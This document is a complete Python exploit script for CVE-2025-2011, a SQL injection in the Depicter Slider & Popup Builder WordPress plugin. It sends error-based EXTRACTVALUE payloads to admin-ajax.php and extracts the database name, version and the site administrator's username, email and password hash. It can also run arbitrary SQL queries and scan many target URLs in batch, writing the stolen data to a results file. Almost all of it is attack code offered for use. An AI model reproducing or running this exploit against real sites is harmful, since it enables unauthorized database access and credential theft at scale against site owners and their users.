#!/usr/bin/env python3

import argparse
import re
import sys
import time
import html
import urllib.parse
from urllib.parse import urlparse
import os

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True)
    USE_COLOR = True
except ImportError:
    class MockColorama:
        def __getattr__(self, name):
            return ""
    
    Fore = Style = MockColorama()
    USE_COLOR = False
    
    print("[!] Missing dependencies. Install with: pip install requests colorama")
    print("[!] Continuing without colored output...")

def print_banner():
    banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.RED}CVE-2025-2011 - SQLi in Depicter Slider & Popup Builder <3.6.2 {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}By datagoboom (Batch Version)                          {Fore.CYAN}        ║
{Fore.CYAN}╚════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """
    print(banner)

def verify_target(url):
    """验证并标准化URL格式"""
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = "http://" + url
    if url.endswith('/'):
        url = url[:-1]
    return url

def test_connection(url, timeout=10):
    """测试目标连接"""
    try:
        response = requests.get(url, timeout=timeout)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def extract_data(url, sql_query, max_length=50, debug=False, verbose=False):
    """执行SQL注入并提取数据"""
    payload = f"test%' AND EXTRACTVALUE(1,CONCAT(0x7e,({sql_query}),0x7e))='&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index"
    
    target_url = f"{url}/wp-admin/admin-ajax.php?s={payload}"
    
    try:
        if debug or verbose:
            print(f"{Fore.BLUE}[DEBUG] Requesting: {target_url}")
            print(f"{Fore.BLUE}[DEBUG] SQL Query: {sql_query}")
        
        response = requests.get(target_url, timeout=20)
        
        if debug or verbose:
            print(f"{Fore.BLUE}[DEBUG] Response status: {response.status_code}")
            print(f"{Fore.BLUE}[DEBUG] Response body preview: {response.text[:500]}")
        
        decoded_text = html.unescape(response.text)
        
        error_pattern = r"XPATH syntax error: '~(.*?)~'"
        match = re.search(error_pattern, decoded_text)
        
        if match:
            extracted_data = match.group(1)
            return extracted_data
        else:
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"{Fore.RED}[-] Error during extraction: {e}")
        return None

def check_vulnerability(url, debug=False, verbose=False):
    """检查目标是否存在漏洞"""
    result = extract_data(url, "database()", debug=debug, verbose=verbose)
    
    if result:
        return True, result, "database"
    
    result = extract_data(url, "VERSION()", debug=debug, verbose=verbose)
    if result:
        return True, result, "version"
    
    result = extract_data(url, "'test'", debug=debug, verbose=verbose)
    if result:
        return True, result, "test"
    
    return False, None, None

def extract_admin_details(url, debug=False, verbose=False):
    """提取管理员详细信息"""
    admin_data = {}
    
    admin_username = extract_data(url, "SELECT user_login FROM wp_users WHERE ID=1 LIMIT 1", debug=debug, verbose=verbose)
    if admin_username:
        admin_data['username'] = admin_username
        
        admin_email = extract_data(url, "SELECT user_email FROM wp_users WHERE ID=1 LIMIT 1", debug=debug, verbose=verbose)
        if admin_email:
            admin_data['email'] = admin_email
        
        hash_left = extract_data(url, "SELECT LEFT(user_pass,30) FROM wp_users WHERE ID=1 LIMIT 1", debug=debug, verbose=verbose)
        if hash_left:
            hash_right = extract_data(url, "SELECT SUBSTRING(user_pass,31,30) FROM wp_users WHERE ID=1 LIMIT 1", debug=debug, verbose=verbose)
            if hash_right:
                admin_data['password_hash'] = hash_left + hash_right
            else:
                admin_data['password_hash'] = hash_left + "..."
    
    return admin_data if admin_data else None

def extract_custom_data(url, query, debug=False, verbose=False):
    """执行自定义SQL查询"""
    result = extract_data(url, query, debug=debug, verbose=verbose)
    return result

def read_urls_from_file(filename):
    """从文件读取URL列表"""
    urls = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    urls.append(line)
        return urls
    except FileNotFoundError:
        print(f"{Fore.RED}[-] File not found: {filename}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Error reading file: {e}")
        sys.exit(1)

def save_results(results, output_file):
    """保存测试结果到文件"""
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("CVE-2025-2011 Batch Scanning Results\n")
            f.write("=" * 80 + "\n\n")
            
            vulnerable_count = sum(1 for r in results if r['vulnerable'])
            f.write(f"Total URLs tested: {len(results)}\n")
            f.write(f"Vulnerable sites: {vulnerable_count}\n")
            f.write(f"Safe sites: {len(results) - vulnerable_count}\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("VULNERABLE SITES\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['vulnerable']:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Status: VULNERABLE\n")
                    f.write(f"Database: {result.get('database', 'N/A')}\n")
                    
                    if result.get('admin_data'):
                        f.write(f"Admin Username: {result['admin_data'].get('username', 'N/A')}\n")
                        f.write(f"Admin Email: {result['admin_data'].get('email', 'N/A')}\n")
                        f.write(f"Password Hash: {result['admin_data'].get('password_hash', 'N/A')}\n")
                    
                    f.write("-" * 80 + "\n\n")
            
            f.write("=" * 80 + "\n")
            f.write("SAFE SITES\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if not result['vulnerable']:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Status: {result.get('status', 'Not Vulnerable')}\n")
                    f.write("-" * 80 + "\n\n")
        
        print(f"{Fore.GREEN}[+] Results saved to: {output_file}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error saving results: {e}")

def test_single_url(url, mode='check', query=None, debug=False, verbose=False):
    """测试单个URL"""
    result = {
        'url': url,
        'vulnerable': False,
        'status': 'Unknown'
    }
    
    print(f"\n{Fore.CYAN}{'=' * 80}")
    print(f"{Fore.YELLOW}[*] Testing: {url}")
    print(f"{Fore.CYAN}{'=' * 80}")
    
    # 验证URL
    target_url = verify_target(url)
    
    # 测试连接
    if not test_connection(target_url):
        print(f"{Fore.RED}[-] Connection failed")
        result['status'] = 'Connection Failed'
        return result
    
    print(f"{Fore.GREEN}[+] Connection successful")
    
    # 检查漏洞
    print(f"{Fore.YELLOW}[*] Checking vulnerability...")
    is_vulnerable, data, data_type = check_vulnerability(target_url, debug=debug, verbose=verbose)
    
    if is_vulnerable:
        print(f"{Fore.GREEN}[+] VULNERABLE!")
        print(f"{Fore.GREEN}[+] Extracted data ({data_type}): {data}")
        result['vulnerable'] = True
        result['status'] = 'Vulnerable'
        result['database'] = data if data_type == 'database' else 'N/A'
        
        # 根据模式执行额外操作
        if mode == 'admin':
            print(f"{Fore.YELLOW}[*] Extracting admin details...")
            admin_data = extract_admin_details(target_url, debug=debug, verbose=verbose)
            if admin_data:
                result['admin_data'] = admin_data
                print(f"{Fore.GREEN}[+] Admin Username: {admin_data.get('username', 'N/A')}")
                print(f"{Fore.GREEN}[+] Admin Email: {admin_data.get('email', 'N/A')}")
                print(f"{Fore.GREEN}[+] Password Hash: {admin_data.get('password_hash', 'N/A')}")
            else:
                print(f"{Fore.RED}[-] Failed to extract admin details")
        
        elif mode == 'custom' and query:
            print(f"{Fore.YELLOW}[*] Executing custom query...")
            custom_result = extract_custom_data(target_url, query, debug=debug, verbose=verbose)
            if custom_result:
                result['custom_result'] = custom_result
                print(f"{Fore.GREEN}[+] Query Result: {custom_result}")
            else:
                print(f"{Fore.RED}[-] Query failed or returned no results")
    else:
        print(f"{Fore.RED}[-] Not vulnerable")
        result['status'] = 'Not Vulnerable'
    
    return result

def batch_test(urls, mode='check', query=None, output_file=None, debug=False, verbose=False, delay=1):
    """批量测试URL列表"""
    results = []
    total = len(urls)
    
    print(f"\n{Fore.CYAN}[*] Starting batch scan of {total} URLs")
    print(f"{Fore.CYAN}[*] Mode: {mode}")
    if delay > 0:
        print(f"{Fore.CYAN}[*] Delay between requests: {delay}s")
    print()
    
    for idx, url in enumerate(urls, 1):
        print(f"\n{Fore.YELLOW}[*] Progress: {idx}/{total}")
        
        result = test_single_url(url, mode=mode, query=query, debug=debug, verbose=verbose)
        results.append(result)
        
        # 延迟以避免过快请求
        if idx < total and delay > 0:
            time.sleep(delay)
    
    # 打印摘要
    print(f"\n{Fore.CYAN}{'=' * 80}")
    print(f"{Fore.CYAN}SCAN SUMMARY")
    print(f"{Fore.CYAN}{'=' * 80}")
    
    vulnerable_count = sum(1 for r in results if r['vulnerable'])
    print(f"{Fore.YELLOW}Total URLs tested: {total}")
    print(f"{Fore.GREEN}Vulnerable sites: {vulnerable_count}")
    print(f"{Fore.BLUE}Safe sites: {total - vulnerable_count}")
    
    if vulnerable_count > 0:
        print(f"\n{Fore.RED}[!] VULNERABLE SITES:")
        for result in results:
            if result['vulnerable']:
                print(f"{Fore.RED}  - {result['url']}")
    
    # 保存结果
    if output_file:
        save_results(results, output_file)
    
    return results

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-2011 - SQLi in Depicter Slider & Popup Builder (Batch Version)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test a single URL
  python3 %(prog)s -u https://example.com

  # Test multiple URLs from a file
  python3 %(prog)s -l urls.txt

  # Test with admin extraction and save results
  python3 %(prog)s -l urls.txt -m admin -o results.txt

  # Test with custom query
  python3 %(prog)s -l urls.txt -m custom -q "SELECT table_name FROM information_schema.tables LIMIT 1"

  # Test with delay between requests
  python3 %(prog)s -l urls.txt --delay 2
        """
    )
    
    # 目标参数
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-u', '--url', help='Single target WordPress URL')
    target_group.add_argument('-l', '--list', help='File containing list of URLs (one per line)')
    
    # 模式参数
    parser.add_argument('-m', '--mode', default='check', 
                       choices=['check', 'admin', 'custom'], 
                       help='Extraction mode: check=vulnerability check, admin=admin details, custom=custom SQL query (default: check)')
    parser.add_argument('-q', '--query', help='Custom SQL query (use with -m custom)')
    
    # 输出参数
    parser.add_argument('-o', '--output', help='Output file to save results')
    
    # 其他参数
    parser.add_argument('--delay', type=float, default=1.0, 
                       help='Delay between requests in seconds (default: 1.0, set to 0 for no delay)')
    parser.add_argument('-d', '--debug', action='store_true', 
                       help='Enable debug output')
    parser.add_argument('-v', '--verbose', action='store_true', 
                       help='Enable verbose output (shows payloads and raw responses)')
    
    args = parser.parse_args()
    
    print_banner()
    
    # 验证自定义模式
    if args.mode == 'custom' and not args.query:
        print(f"{Fore.RED}[-] Custom mode requires a SQL query (-q/--query)")
        sys.exit(1)
    
    # 单个URL测试
    if args.url:
        result = test_single_url(
            args.url, 
            mode=args.mode, 
            query=args.query, 
            debug=args.debug, 
            verbose=args.verbose
        )
        
        if args.output:
            save_results([result], args.output)
    
    # 批量URL测试
    elif args.list:
        print(f"{Fore.YELLOW}[*] Reading URLs from: {args.list}")
        urls = read_urls_from_file(args.list)
        print(f"{Fore.GREEN}[+] Loaded {len(urls)} URLs")
        
        results = batch_test(
            urls, 
            mode=args.mode, 
            query=args.query, 
            output_file=args.output,
            debug=args.debug, 
            verbose=args.verbose,
            delay=args.delay
        )
    
    print(f"\n{Fore.YELLOW}[!] Scan complete")

if __name__ == "__main__":
    main()
